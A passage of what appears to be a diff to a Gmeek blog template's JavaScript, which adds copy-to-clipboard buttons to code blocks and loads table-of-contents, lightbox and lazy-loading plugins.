1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -497,7 +487,70 @@ function iFrameLoading(){
     }
 }
 
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
 
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
 
 </script>
 </script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
